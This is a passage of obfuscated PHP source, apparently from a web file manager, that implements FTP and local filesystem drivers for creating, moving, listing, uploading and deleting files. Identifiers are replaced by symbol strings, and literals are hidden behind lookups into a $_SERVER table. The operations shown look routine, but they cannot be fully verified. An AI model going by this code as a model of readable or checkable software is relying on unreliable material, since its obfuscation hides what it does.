return $this->iconvTo($‡ÍÙŒ’, $this->appCharset, $this->systemCharset); } public function getPathOuter($»∏≤ß≥á) { $Öù™ﬂ∏“ =& $_SERVER[Çâä∆◊¡]; $À¢Ê√öÅ = $this->iconvApp($this->pathBase); $»∏≤ß≥á = $this->iconvApp($»∏≤ß≥á); if (substr($À¢Ê√öÅ, 0, 2) == $Öù™ﬂ∏“[1352]) { $À¢Ê√öÅ = BASIC_PATH . substr($À¢Ê√öÅ, 2); } if (substr($»∏≤ß≥á, 0, 2) == $Öù™ﬂ∏“[1352]) { $»∏≤ß≥á = BASIC_PATH . substr($»∏≤ß≥á, 2); } $À¢Ê√öÅ = KodIO::clear($À¢Ê√öÅ); $»∏≤ß≥á = KodIO::clear($»∏≤ß≥á); $»∏≤ß≥á = substr($»∏≤ß≥á, strlen($À¢Ê√öÅ)); if (empty($this->pathDriver)) { return $»∏≤ß≥á; } return $this->pathDriver . $Öù™ﬂ∏“[8] . ltrim($»∏≤ß≥á, $Öù™ﬂ∏“[8]); } private function _init($æªÌﬁ∂‘ = array()) { $ﬁ‰–êí– =& $_SERVER[Çâä∆◊¡]; if (!function_exists($ﬁ‰–êí–[1353])) { throw new Exception(LNG($ﬁ‰–êí–[1354])); } $this->config = $æªÌﬁ∂‘; $this->charsetReset($æªÌﬁ∂‘); foreach ($æªÌﬁ∂‘ as $¿á€É¡¥ => $ù®Û€ºÌ) { if (isset($this->{$¿á€É¡¥})) { $this->{$¿á€É¡¥} = $ù®Û€ºÌ; } } return $this->_login($æªÌﬁ∂‘); } private function _login($Ü◊‡»±√) { $µ¶¸€Û¢ =& $_SERVER[Çâä∆◊¡]; static $≠ï‰í±¢ = array(); $´ŸÈı•® = md5(json_encode($Ü◊‡»±√)); if (isset($≠ï‰í±¢[$´ŸÈı•®])) { foreach ($≠ï‰í±¢[$´ŸÈı•®] as $√Áø‰Ìò => $ãòÌÎÃŒ) { $this->{$√Áø‰Ìò} = $ãòÌÎÃŒ; } return !0; } $úÅèÑ¯ó = parse_url(trim($this->server, $µ¶¸€Û¢[8])); $this->host = $úÅèÑ¯ó[$µ¶¸€Û¢[174]]; $——›ÒÙû = isset($úÅèÑ¯ó[$µ¶¸€Û¢[173]]) && $úÅèÑ¯ó[$µ¶¸€Û¢[173]] == $µ¶¸€Û¢[1355] ? !0 : !1; $this->scheme = $——›ÒÙû ? $µ¶¸€Û¢[1356] : $µ¶¸€Û¢[1357]; $this->port = isset($úÅèÑ¯ó[$µ¶¸€Û¢[175]]) ? $úÅèÑ¯ó[$µ¶¸€Û¢[175]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $óﬂ´«µ“ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $“±õÙ‰Ñ = $this->pasv == $µ¶¸€Û¢[89] ? !0 : !1; @ftp_pasv($this->connect, $“±õÙ‰Ñ); $≠ï‰í±¢[$´ŸÈı•®] = array($µ¶¸€Û¢[1358] => $this->connect, $µ¶¸€Û¢[174] => $this->host, $µ¶¸€Û¢[173] => $this->scheme, $µ¶¸€Û¢[175] => $this->port); return $óﬂ´«µ“; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($†ÑúîΩ·, $ÁÈ◊Ÿ≠Ω = '', $∑ñ¯ËÇÑ = REPEAT_RENAME) { if ($this->setContent($†ÑúîΩ·, $ÁÈ◊Ÿ≠Ω)) { return $this->getPathOuter($†ÑúîΩ·); } return !1; } public function mkdir($Ñˆ€∫ìï, $°∫˝·Ôˆ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $Ñˆ€∫ìï = $this->iconvSystem($Ñˆ€∫ìï); if ($this->_isFolder($Ñˆ€∫ìï) || @ftp_mkdir($this->connect, $Ñˆ€∫ìï)) { return $this->getPathOuter($Ñˆ€∫ìï); } if (!$this->mkdir($this->pathFather($Ñˆ€∫ìï))) { return !1; } if ($Ñˆ€∫ìï = @ftp_mkdir($this->connect, $Ñˆ€∫ìï)) { return $this->getPathOuter($Ñˆ€∫ìï); } return !1; } public function copyFile($ÊÉ≈µ•◊, $±áÓ≈åÑ) { if (!$this->_isconn()) { return !1; } $˜‚áìõ = $this->pathThis($this->iconvSystem($ÊÉ≈µ•◊)); $≠´˙ê⁄¯ = $this->tempFile($˜‚áìõ); $áòƒÿ§ñ = $this->iconvApp($≠´˙ê⁄¯); $this->download($ÊÉ≈µ•◊, $áòƒÿ§ñ); $Ëå∆€⁄Á = $this->upload($±áÓ≈åÑ, $áòƒÿ§ñ); $this->tempFileRemve($≠´˙ê⁄¯); return $Ëå∆€⁄Á; } public function moveFile($™øÓ›∆¥, $™˜ƒÏàÅ) { if (!$this->_isconn()) { return !1; } $™øÓ›∆¥ = $this->iconvSystem($™øÓ›∆¥); $™˜ƒÏàÅ = $this->iconvSystem($™˜ƒÏàÅ); $€Æ≠â˛± = @ftp_rename($this->connect, $™øÓ›∆¥, $™˜ƒÏàÅ); return $€Æ≠â˛± ? $this->getPathOuter($™˜ƒÏàÅ) : !1; } public function delFile($—Æë÷¶î) { if (!$this->_isconn()) { return !1; } $—Æë÷¶î = $this->iconvSystem($—Æë÷¶î); return @ftp_delete($this->connect, $—Æë÷¶î); } public function delFolder($ö∂πúáÉ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $¢È•´ØÊ = $¯¥√ã˛œ = array(); $this->fileList($ö∂πúáÉ, $¢È•´ØÊ, $¯¥√ã˛œ, !0); $this->listItemCache = !0; foreach ($¯¥√ã˛œ as $Ÿòßó«¨) { $Ï¡àÓÍó = $this->iconvSystem($Ÿòßó«¨[$_SERVER[Çâä∆◊¡][32]]); $ØÕˆÀòâ = @ftp_delete($this->connect, $Ï¡àÓÍó); if (!$ØÕˆÀòâ) { return !1; } } foreach ($¢È•´ØÊ as $Ï¡àÓÍó) { $Ï¡àÓÍó = $this->iconvSystem($Ï¡àÓÍó); $ØÕˆÀòâ = @ftp_rmdir($this->connect, $Ï¡àÓÍó); if (!$ØÕˆÀòâ) { return !1; } } $ö∂πúáÉ = $this->iconvSystem($ö∂πúáÉ); return @ftp_rmdir($this->connect, $ö∂πúáÉ); } public function rename($≤¶ê∂ÕŸ, $¢”…À∞Î) { $äèÍ∞´ =& $_SERVER[Çâä∆◊¡]; if (!$this->_isconn()) { return !1; } $æ˙ÖØÆœ = $this->fileNameAuto($this->pathFather($≤¶ê∂ÕŸ), $¢”…À∞Î); $æ˙ÖØÆœ = $this->iconvSystem($æ˙ÖØÆœ); $≤¶ê∂ÕŸ = $this->iconvSystem($≤¶ê∂ÕŸ); $ªÛÍúõﬂ = $this->pathFather($≤¶ê∂ÕŸ); $˚éØœïÆ = rtrim($ªÛÍúõﬂ, $äèÍ∞´[8]) . $äèÍ∞´[8] . $æ˙ÖØÆœ; $«Ï⁄ªÑü = @ftp_rename($this->connect, $≤¶ê∂ÕŸ, $˚éØœïÆ); $˚éØœïÆ = $this->iconvApp($˚éØœïÆ); return $«Ï⁄ªÑü ? $this->getPathOuter($˚éØœïÆ) : !1; } private function folderInfo($Œœèõºò, $Ø¸“Õø¬ = false) { $ŸÜ»∫íÛ =& $_SERVER[Çâä∆◊¡]; $‹ùÚÏå‰ = array($ŸÜ»∫íÛ[32] => $this->pathThis($Œœèõºò), $ŸÜ»∫íÛ[78] => $this->getPathOuter($ŸÜ»∫íÛ[8] . $Œœèõºò), $ŸÜ»∫íÛ[33] => $ŸÜ»∫íÛ[79]); if ($Ø¸“Õø¬) { return $‹ùÚÏå‰; } $‹ùÚÏå‰[$ŸÜ»∫íÛ[193]] = $‹ùÚÏå‰[$ŸÜ»∫íÛ[86]] = 0; $‹ùÚÏå‰[$ŸÜ»∫íÛ[194]] = $‹ùÚÏå‰[$ŸÜ»∫íÛ[195]] = !0; return $‹ùÚÏå‰; } private function fileInfo($ã⁄’Õ—ı, $ã˝Ö∞çœ = false, $ÛπÆ≈Ω— = array()) { $Ê®˝ú¬∆ =& $_SERVER[Çâä∆◊¡]; $©‹Ü‚õ‘ = array($Ê®˝ú¬∆[32] => $this->pathThis($ã⁄’Õ—ı), $Ê®˝ú¬∆[78] => $this->getPathOuter($Ê®˝ú¬∆[8] . $ã⁄’Õ—ı), $Ê®˝ú¬∆[33] => $Ê®˝ú¬∆[192], $Ê®˝ú¬∆[80] => isset($ÛπÆ≈Ω—[$Ê®˝ú¬∆[80]]) ? $ÛπÆ≈Ω—[$Ê®˝ú¬∆[80]] : 0, $Ê®˝ú¬∆[167] => $this->ext($ã⁄’Õ—ı)); if ($ã˝Ö∞çœ) { return $©‹Ü‚õ‘; } $©‹Ü‚õ‘[$Ê®˝ú¬∆[193]] = $©‹Ü‚õ‘[$Ê®˝ú¬∆[86]] = 0; $©‹Ü‚õ‘[$Ê®˝ú¬∆[194]] = $©‹Ü‚õ‘[$Ê®˝ú¬∆[195]] = !0; $ﬁ€˜Ê√Æ = $this->iconvSystem($ã⁄’Õ—ı); $©‹Ü‚õ‘[$Ê®˝ú¬∆[86]] = @ftp_mdtm($this->connect, $ﬁ€˜Ê√Æ); if (empty($ÛπÆ≈Ω—)) { $ÛπÆ≈Ω— = $this->objectMeta($ã⁄’Õ—ı); if (!$ÛπÆ≈Ω—) { return $©‹Ü‚õ‘; } } $©‹Ü‚õ‘[$Ê®˝ú¬∆[80]] = $ÛπÆ≈Ω—[$Ê®˝ú¬∆[80]]; return $©‹Ü‚õ‘; } public function size($îäÜ˜‚Ç) { $†¨¯Ç–› = $this->objectMeta($îäÜ˜‚Ç); return $†¨¯Ç–› ? $†¨¯Ç–›[$_SERVER[Çâä∆◊¡][80]] : 0; } public function info($ü˚ÉÇπõ) { if ($this->isFile($ü˚ÉÇπõ)) { return $this->fileInfo($ü˚ÉÇπõ, 0); } else { if ($this->isFolder($ü˚ÉÇπõ)) { return $this->folderInfo($ü˚ÉÇπõ); } } return !1; } private function fileList($™Á¡ÏÃŒ, &$ò¯ßﬂﬁ§, &$æ∑Ò‡ª–, $∂á¥Êó√ = false) { $∫ì£∞“¶ =& $_SERVER[Çâä∆◊¡]; $™Á¡ÏÃŒ = $this->iconvSystem($™Á¡ÏÃŒ); if (!$this->isFolder($™Á¡ÏÃŒ)) { return !1; } @ftp_chdir($this->connect, $∫ì£∞“¶[8]); $™Á¡ÏÃŒ = rtrim($™Á¡ÏÃŒ, $∫ì£∞“¶[8]) . $∫ì£∞“¶[8]; check_abort(); $ÏÔâµóï = $this->listItemCache === !1 ? !1 : !0; $§™ôúﬂ¢ = @ftp_rawlist($this->connect, $™Á¡ÏÃŒ); if (!$§™ôúﬂ¢) { $§™ôúﬂ¢ = array(); } $Ω€†ÕÅÅ = array($∫ì£∞“¶[10] => 1, $∫ì£∞“¶[1359] => 1); foreach ($§™ôúﬂ¢ as $µ ÈıÌ¬) { $›ã˘É÷π = $this->_listItem($µ ÈıÌ¬); if ($›ã˘É÷π[0] == $∫ì£∞“¶[752]) { continue; } $Øπ¥«÷â = $›ã˘É÷π[8]; if (empty($Øπ¥«÷â) && $Øπ¥«÷â !== $∫ì£∞“¶[190] || isset($Ω€†ÕÅÅ[$Øπ¥«÷â])) { continue; } $Øπ¥«÷â = $this->iconvApp($™Á¡ÏÃŒ . ltrim($Øπ¥«÷â, $∫ì£∞“¶[8])); $ıüå∂å¡ = array($∫ì£∞“¶[32] => $Øπ¥«÷â, $∫ì£∞“¶[33] => $∫ì£∞“¶[192], $∫ì£∞“¶[80] => $›ã˘É÷π[4]); if (substr($µ ÈıÌ¬, 0, 1) == $∫ì£∞“¶[1360]) { $ıüå∂å¡[$∫ì£∞“¶[33]] = $∫ì£∞“¶[79]; $ıüå∂å¡[$∫ì£∞“¶[80]] = 0; } $üúáÆ¡ô = $ıüå∂å¡[$∫ì£∞“¶[33]] == $∫ì£∞“¶[79] ? !0 : !1; if ($ÏÔâµóï) { $this->cacheMethod($∫ì£∞“¶[198], $Øπ¥«÷â, $üúáÆ¡ô); $this->cacheMethod($∫ì£∞“¶[199], $Øπ¥«÷â, $ıüå∂å¡); } if ($üúáÆ¡ô) { $ò¯ßﬂﬁ§[] = $Øπ¥«÷â; if ($∂á¥Êó√) { $this->fileList($Øπ¥«÷â, $ò¯ßﬂﬁ§, $æ∑Ò‡ª–, $∂á¥Êó√); } continue; } $æ∑Ò‡ª–[] = $ıüå∂å¡; } if ($ÏÔâµóï) { $this->cacheMethod($∫ì£∞“¶[198], $™Á¡ÏÃŒ, !0); } } private function _listItem($…π´°Ìÿ) { if (empty($…π´°Ìÿ)) { return array(); } $íèÛ«ƒÈ = preg_split($_SERVER[Çâä∆◊¡][1361], $…π´°Ìÿ); if (count($íèÛ«ƒÈ) <= 9) { return $íèÛ«ƒÈ; } $íèÛ«ƒÈ[8] = trim(substr($…π´°Ìÿ, strpos($…π´°Ìÿ, $íèÛ«ƒÈ[7]) + strlen($íèÛ«ƒÈ[7]))); return array_splice($íèÛ«ƒÈ, 0, 9); } public function listPath($Úö«Ÿç˝, $˛ØÀ¡ô± = false) { $œÁ‚Äºœ =& $_SERVER[Çâä∆◊¡]; if (!$this->_isconn()) { return !1; } $◊¿†Îì„ = $ïÃ≠∫Ω• = array(); $this->fileList($Úö«Ÿç˝, $◊¿†Îì„, $ïÃ≠∫Ω•); foreach ($◊¿†Îì„ as $‡∏Á·åΩ => $“≤üµàç) { $◊¿†Îì„[$‡∏Á·åΩ] = $this->folderInfo($“≤üµàç, $˛ØÀ¡ô±); } foreach ($ïÃ≠∫Ω• as $‡∏Á·åΩ => $“≤üµàç) { $ïÃ≠∫Ω•[$‡∏Á·åΩ] = $this->fileInfo($“≤üµàç[$œÁ‚Äºœ[32]], $˛ØÀ¡ô±, $“≤üµàç); } return array($œÁ‚Äºœ[77] => $◊¿†Îì„, $œÁ‚Äºœ[76] => $ïÃ≠∫Ω•); } public function has($⁄Ëï»≥…, $Â◊ìçÒ• = false, $ìÎÚ¢’Ê = true) { $È⁄¢ö≥ú =& $_SERVER[Çâä∆◊¡]; $´Ÿã≤…õ = $ôìã≤÷‹ = array(); $£ÿ®å≤È = $Â◊ìçÒ• ? !0 : !1; $this->fileList($⁄Ëï»≥…, $´Ÿã≤…õ, $ôìã≤÷‹, $£ÿ®å≤È); if ($Â◊ìçÒ•) { return array($È⁄¢ö≥ú[202] => count($ôìã≤÷‹), $È⁄¢ö≥ú[203] => count($´Ÿã≤…õ)); } if ($ìÎÚ¢’Ê) { if (count($ôìã≤÷‹)) { return !0; } } else { if (count($´Ÿã≤…õ)) { return !0; } } return !1; } public function listAll($œ‹⁄É◊ﬂ) { $´ß¶Ó‡• =& $_SERVER[Çâä∆◊¡]; if (!$this->_isconn()) { return !1; } $∞Äéöñ  = $ØÚ≤åÕ’ = array(); $this->fileList($œ‹⁄É◊ﬂ, $∞Äéöñ , $ØÚ≤åÕ’, !0); $π”ëó÷û = array(); foreach ($ØÚ≤åÕ’ as $®æ µæ„) { $π”ëó÷û[$®æ µæ„[$´ß¶Ó‡•[32]]] = $®æ µæ„[$´ß¶Ó‡•[80]]; } foreach ($∞Äéöñ  as $®æ µæ„) { if (is_string($®æ µæ„)) { $π”ëó÷û[$®æ µæ„] = 0; } } return $this->listAllFiles($œ‹⁄É◊ﬂ, array_keys($π”ëó÷û), $π”ëó÷û); } public function getContent($µÂ∞Æ˘˛) { if (!$this->_isconn()) { return !1; } $µÂ∞Æ˘˛ = $this->iconvSystem($µÂ∞Æ˘˛); return $this->fileSubstr($µÂ∞Æ˘˛); } public function setContent($ß⁄û®ı˚, $õÖÛ˝∑È = '') { if (!$this->_isconn()) { return !1; } $Úå§ä§„ = $this->pathThis($this->iconvSystem($ß⁄û®ı˚)); $ô£∆¯ﬁ = $this->tempFile($Úå§ä§„); file_put_contents($ô£∆¯ﬁ, $õÖÛ˝∑È); $°∞¢∆·’ = $this->upload($ß⁄û®ı˚, $this->iconvApp($ô£∆¯ﬁ)); $this->tempFileRemve($ô£∆¯ﬁ); return $°∞¢∆·’; } public function fileSubstr($“Áô«ªÑ, $è©ªÁ” = 0, $‹≤™«≤É = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($“Áô«ªÑ, $è©ªÁ”, $‹≤™«≤É); } private function ftpRequest($¢õ€¶áﬁ, $º„¶ úî = 0, $‘„√Èñı = false) { $¢õ€¶áﬁ = $this->iconvSystem($¢õ€¶áﬁ); $Âﬁ∑ò˝ô = $this->scheme . $this->host . $_SERVER[Çâä∆◊¡][4] . $this->port; $ê« ìÒ• = curl_init(); curl_setopt($ê« ìÒ•, CURLOPT_URL, $Âﬁ∑ò˝ô . $this->pathEncode($¢õ€¶áﬁ)); curl_setopt($ê« ìÒ•, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($‘„√Èñı) { $∑Ù¡êﬂœ = $º„¶ úî + $‘„√Èñı - 1; curl_setopt($ê« ìÒ•, CURLOPT_RANGE, "{$º„¶ úî}\x2d{$∑Ù¡êﬂœ}"); } curl_setopt($ê« ìÒ•, CURLOPT_RETURNTRANSFER, 1); $•ÎÂõé∫ = curl_exec($ê« ìÒ•); curl_close($ê« ìÒ•); return $•ÎÂõé∫; } public function upload($è§πÙè‹, $àî‰‚Ëå, $Œ˙‡ÿ∑Ü = false, $≠ò≈…“œ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($è§πÙè‹))) { return !1; } $è§πÙè‹ = $this->iconvSystem($è§πÙè‹); $àî‰‚Ëå = $this->iconvSystem($àî‰‚Ëå); $≥¢µòı∏ = ftp_nb_put($this->connect, $è§πÙè‹, $àî‰‚Ëå, FTP_BINARY); while ($≥¢µòı∏ == FTP_MOREDATA) { $≥¢µòı∏ = ftp_nb_continue($this->connect); } if ($≥¢µòı∏ != FTP_FINISHED) { return !1; } return $this->getPathOuter($è§πÙè‹); } public function download($µùÃ«ˆ…, $—îºª˘ƒ = '') { if (!$this->_isconn()) { return !1; } $µãß£–Ä = $this->pathFather($—îºª˘ƒ); if (!IO::mkdir($µãß£–Ä)) { return !1; } $µùÃ«ˆ… = $this->iconvSystem($µùÃ«ˆ…); $—îºª˘ƒ = $this->iconvSystem($—îºª˘ƒ); $îÓÑ ∂· = ftp_nb_get($this->connect, $—îºª˘ƒ, $µùÃ«ˆ…, FTP_BINARY); while ($îÓÑ ∂· == FTP_MOREDATA) { $îÓÑ ∂· = ftp_nb_continue($this->connect); } if ($îÓÑ ∂· != FTP_FINISHED) { return !1; } return $this->iconvApp($—îºª˘ƒ); } public function exist($√ƒÂ⁄Î) { return $this->isFile($√ƒÂ⁄Î) || $this->isFolder($√ƒÂ⁄Î); } public function isFile($¯ˆ™ó®Æ) { return !$this->isFolder($¯ˆ™ó®Æ) && $this->objectMeta($¯ˆ™ó®Æ); } public function isFolder($‹‚å¥√) { return $this->cacheMethod($_SERVER[Çâä∆◊¡][198], $‹‚å¥√); } protected function objectMeta($≠ å»Â·) { return $this->cacheMethod($_SERVER[Çâä∆◊¡][199], $≠ å»Â·); } protected function _objectMeta($´ãñ«˜‰) { $û◊ŒúÔ =& $_SERVER[Çâä∆◊¡]; if ($´ãñ«˜‰ == $û◊ŒúÔ[12] || $´ãñ«˜‰ == $û◊ŒúÔ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $´ãñ«˜‰ = $this->iconvSystem($´ãñ«˜‰); $œòﬁ˝•‚ = array($û◊ŒúÔ[32] => $this->iconvApp($´ãñ«˜‰), $û◊ŒúÔ[33] => $û◊ŒúÔ[192], $û◊ŒúÔ[80] => 0); @ftp_chdir($this->connect, $û◊ŒúÔ[8]); $ÔŸ÷Ùùù = @ftp_size($this->connect, $´ãñ«˜‰); if ($ÔŸ÷Ùùù != -1) { $œòﬁ˝•‚[$û◊ŒúÔ[80]] = $ÔŸ÷Ùùù; } else { $˜¶˚Ñ…≥ = @ftp_chdir($this->connect, $´ãñ«˜‰); if (!$˜¶˚Ñ…≥) { return !1; } $œòﬁ˝•‚[$û◊ŒúÔ[33]] = $û◊ŒúÔ[79]; } return $œòﬁ˝•‚; } protected function _isFolder($‚éÏ‘˘ü) { $¿âÕîˆª =& $_SERVER[Çâä∆◊¡]; if ($‚éÏ‘˘ü == $¿âÕîˆª[12] || $‚éÏ‘˘ü == $¿âÕîˆª[8]) { return !0; } $¨ÆÔöûå = $this->_objectMeta($‚éÏ‘˘ü); return isset($¨ÆÔöûå[$¿âÕîˆª[33]]) && $¨ÆÔöûå[$¿âÕîˆª[33]] == $¿âÕîˆª[79] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($˝±…õ’È) { if (substr($˝±…õ’È, 0, 2) == $_SERVER[Çâä∆◊¡][1352]) { $˝±…õ’È = BASIC_PATH . substr($˝±…õ’È, 2); } return $˝±…õ’È; } public function iconvApp($¬ÛÀ«¯•) { $ª≤ﬂ⁄ÊÈ =& $_SERVER[Çâä∆◊¡]; global $config; return $this->iconvTo($¬ÛÀ«¯•, $config[$ª≤ﬂ⁄ÊÈ[1350]], $config[$ª≤ﬂ⁄ÊÈ[1349]]); } public function iconvSystem($éà®Õªß) { $„ÔÇ˝¬È =& $_SERVER[Çâä∆◊¡]; global $config; return $this->iconvTo($éà®Õªß, $config[$„ÔÇ˝¬È[1349]], $config[$„ÔÇ˝¬È[1350]]); } public function getPathOuter($√äé∫ø˘) { $ıÔËƒ˘Ä =& $_SERVER[Çâä∆◊¡]; $Ò¯ä«‡É = $this->iconvApp($this->pathBase); $√äé∫ø˘ = $this->iconvApp($√äé∫ø˘); if (substr($Ò¯ä«‡É, 0, 2) == $ıÔËƒ˘Ä[1352]) { $Ò¯ä«‡É = BASIC_PATH . substr($Ò¯ä«‡É, 2); } if (substr($√äé∫ø˘, 0, 2) == $ıÔËƒ˘Ä[1352]) { $√äé∫ø˘ = BASIC_PATH . substr($√äé∫ø˘, 2); } $Ò¯ä«‡É = KodIO::clear($Ò¯ä«‡É); $√äé∫ø˘ = KodIO::clear($√äé∫ø˘); $√äé∫ø˘ = substr($√äé∫ø˘, strlen($Ò¯ä«‡É)); if (empty($this->pathDriver)) { return $√äé∫ø˘; } return $this->pathDriver . $ıÔËƒ˘Ä[8] . ltrim($√äé∫ø˘, $ıÔËƒ˘Ä[8]); } public function mkfile($Ç‰í†Úî, $ÙõŸÀ¿π = '', $öÁ“Ä ﬂ = REPEAT_RENAME) { $Ç‰í†Úî = $this->iconvSystem($Ç‰í†Úî); @touch($Ç‰í†Úî); if ($ÙõŸÀ¿π) { file_put_contents($Ç‰í†Úî, $ÙõŸÀ¿π); } @chmod($Ç‰í†Úî, $this->pathAuth); return is_file($Ç‰í†Úî) ? $this->getPathOuter($Ç‰í†Úî) : !1; } public function mkdir($ÑËƒ∞¢˛, $íﬂﬁºôÙ = REPEAT_SKIP) { $ÑËƒ∞¢˛ = $this->iconvSystem($ÑËƒ∞¢˛); if (is_dir($ÑËƒ∞¢˛)) { return $this->getPathOuter($ÑËƒ∞¢˛); } @mkdir($ÑËƒ∞¢˛, $this->pathAuth, !0); @chmod($ÑËƒ∞¢˛, $this->pathAuth); return is_dir($ÑËƒ∞¢˛) ? $this->getPathOuter($ÑËƒ∞¢˛) : !1; } public function copyFile($ø∑µÑ“Ñ, $ ËÈæ„¡) { $this->mkdir($this->pathFather($ ËÈæ„¡)); $ø∑µÑ“Ñ = $this->iconvSystem($ø∑µÑ“Ñ); $ ËÈæ„¡ = $this->iconvSystem($ ËÈæ„¡); $¶àªæ‚√ = copy_64($ø∑µÑ“Ñ, $ ËÈæ„¡); @chmod($ ËÈæ„¡, $this->pathAuth); return $¶àªæ‚√ ? $this->getPathOuter($ ËÈæ„¡) : !1; } public function moveFile($Ä±Ã•‡¢, $†ªäÄ≈˛) { $this->mkdir($this->pathFather($†ªäÄ≈˛)); $Ä±Ã•‡¢ = $this->iconvSystem($Ä±Ã•‡¢); $†ªäÄ≈˛ = $this->iconvSystem($†ªäÄ≈˛); $ùﬁÄÒÁ› = intval(@rename($Ä±Ã•‡¢, $†ªäÄ≈˛)); if (!$ùﬁÄÒÁ›) { if ($ùﬁÄÒÁ› = intval(@copy_64($Ä±Ã•‡¢, $†ªäÄ≈˛))) { @unlink($Ä±Ã•‡¢); } } @chmod($†ªäÄ≈˛, $this->pathAuth); return $ùﬁÄÒÁ› ? $this->getPathOuter($†ªäÄ≈˛) : !1; } public function movePath($¸¥Ö»˛ô, $∂û˙àÌÏ, $ßÇ∂úì© = false) { $¶¯Å¬©§ =& $_SERVER[Çâä∆◊¡]; $¸¥Ö»˛ô = $this->iconvSystem($¸¥Ö»˛ô); $∂û˙àÌÏ = $this->iconvSystem($∂û˙àÌÏ); $ïØ¸Òâ¿ = rtrim($∂û˙àÌÏ, $¶¯Å¬©§[8]) . $¶¯Å¬©§[8] . ($ßÇ∂úì© ? $ßÇ∂úì© : get_path_this($¸¥Ö»˛ô)); if (file_exists($ïØ¸Òâ¿)) { return !1; } $©õ⁄£ï„ = intval(@rename($¸¥Ö»˛ô, $ïØ¸Òâ¿)); $©õ⁄£ï„ = file_exists($ïØ¸Òâ¿); return $©õ⁄£ï„ ? $this->getPathOuter($ïØ¸Òâ¿) : !1; } public function delFile($¬ﬂóºëŸ) { $¬ﬂóºëŸ = $this->iconvSystem($¬ﬂóºëŸ); if (!@unlink($¬ﬂóºëŸ)) { @chmod($¬ﬂóºëŸ, $this->pathAuth); if (!@unlink($¬ﬂóºëŸ)) { return !1; } } else { return !0; } } public function delFolder($À»ˆã©ı) { $¿¨éùñÓ =& $_SERVER[Çâä∆◊¡]; $À»ˆã©ı = $this->iconvSystem($À»ˆã©ı); if (!is_dir($À»ˆã©ı)) { return !0; } if (!($ëôó˚Åÿ = opendir($À»ˆã©ı))) { return !1; } while (($ÄÓóÚ·Ω = readdir($ëôó˚Åÿ)) !== !1) { if ($ÄÓóÚ·Ω == $¿¨éùñÓ[10] || $ÄÓóÚ·Ω == $¿¨éùñÓ[1359]) { continue; } $ÛÍ•ÓÂ¸ = $À»ˆã©ı . $¿¨éùñÓ[8] . $ÄÓóÚ·Ω; if (is_file($ÛÍ•ÓÂ¸) || is_link($ÛÍ•ÓÂ¸)) { if (!unlink($ÛÍ•ÓÂ¸)) { chmod($ÛÍ•ÓÂ¸, $this->pathAuth); if (!unlink($ÛÍ•ÓÂ¸)) { return !1; } } } else { if (is_dir($ÛÍ•ÓÂ¸)) { chmod($ÛÍ•ÓÂ¸, $this->pathAuth); $ÛÍ•ÓÂ¸ = $this->iconvApp($ÛÍ•ÓÂ¸); if (!$this->delFolder($ÛÍ•ÓÂ¸)) { return !1; } } } } closedir($ëôó˚Åÿ); return rmdir($À»ˆã©ı); } public function rename($ú∞ú¨ªÍ, $ò≠≈î⁄”) { $Ì ¯î…œ =& $_SERVER[Çâä∆◊¡]; $ˆ€ÿ¡Ï◊ = $this->fileNameAuto($this->pathFather($ú∞ú¨ªÍ), $ò≠≈î⁄”); $ˆ€ÿ¡Ï◊ = $this->iconvSystem($ˆ€ÿ¡Ï◊); $ú∞ú¨ªÍ = $this->iconvSystem($ú∞ú¨ªÍ); $ÿåÆÍùæ = $this->pathFather($ú∞ú¨ªÍ); $¬¡»¬˙ = rtrim($ÿåÆÍùæ, $Ì ¯î…œ[8]) . $Ì ¯î…œ[8] . $ˆ€ÿ¡Ï◊; $™€„®«º = @rename($ú∞ú¨ªÍ, $¬¡»¬˙); $¬¡»¬˙ = $this->iconvApp($¬¡»¬˙); return $™€„®«º ? $this->getPathOuter($¬¡»¬˙) : !1; } public function size($¬ø‡¢Ù) { $¬ø‡¢Ù = $this->iconvSystem($¬ø‡¢Ù); return filesize_64($¬ø‡¢Ù); } public function info($ØÆ¯”ë˝) { $ØÆ¯”ë˝ = $this->iconvSystem($ØÆ¯”ë˝); if ($this->isFolder($ØÆ¯”ë˝)) { return $this->folderInfo($ØÆ¯”ë˝); } else { if ($this->isFile($ØÆ¯”ë˝)) { return $this->fileInfo($ØÆ¯”ë˝); } } return !1; } protected function infoChildren($∫∞ıÛï¡, &$«Á”˜ƒâ, $–˛’™ÆÛ = true) { $∑ºÓ¿æà =& $_SERVER[Çâä∆◊¡]; check_abort_echo(); $∫∞ıÛï¡ = rtrim($∫∞ıÛï¡, $∑ºÓ¿æà[8]) . $∑ºÓ¿æà[8]; if ($–˛’™ÆÛ) { $∫∞ıÛï¡ = $this->iconvSystem($∫∞ıÛï¡); } if (!($íÍÜ”ﬂ¶ = @opendir($∫∞ıÛï¡))) { return; } while (($”˜ê⁄¨ = readdir($íÍÜ”ﬂ¶)) !== !1) { if ($”˜ê⁄¨ == $∑ºÓ¿æà[10] || $”˜ê⁄¨ == $∑ºÓ¿æà[1359]) { continue; } $åÚÖı≠’ = $∫∞ıÛï¡ . $”˜ê⁄¨; if (is_file($åÚÖı≠’) || is_link($åÚÖı≠’)) { $«Á”˜ƒâ[$∑ºÓ¿æà[81]]++; $«Á”˜ƒâ[$∑ºÓ¿æà[80]] += filesize_64($åÚÖı≠’); } else { if (is_dir($åÚÖı≠’)) { $«Á”˜ƒâ[$∑ºÓ¿æà[82]]++; $this->infoChildren($åÚÖı≠’, $«Á”˜ƒâ, !1); } } } closedir($íÍÜ”ﬂ¶); } private function folderInfo($ì™ÕÅÔÒ, $ªƒ∫äíô = false) { $åÿ…ÅÍ® =& $_SERVER[Çâä∆◊¡]; $ì™ÕÅÔÒ = rtrim($ì™ÕÅÔÒ, $åÿ…ÅÍ®[8]) . $åÿ…ÅÍ®[8]; $∂¶˘ï–á = $this->iconvApp($this->pathThis($ì™ÕÅÔÒ)); if 